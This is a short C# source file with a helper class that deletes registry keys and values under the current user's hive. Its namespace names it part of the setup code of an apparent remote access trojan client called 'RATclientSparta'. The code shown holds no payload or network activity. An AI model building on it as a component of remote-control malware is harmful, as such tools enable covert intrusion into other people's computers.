using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace RATclientSparta.Setup.RegistryData
{
    public class RegistryDelete
    {
        public void DeleteKey(string value)
        {
            Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree(value, false);
        }
        public void DeleteValue(string value)
        {
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\ClientValues", true);
            key.DeleteValue(value);
        }
    }
}
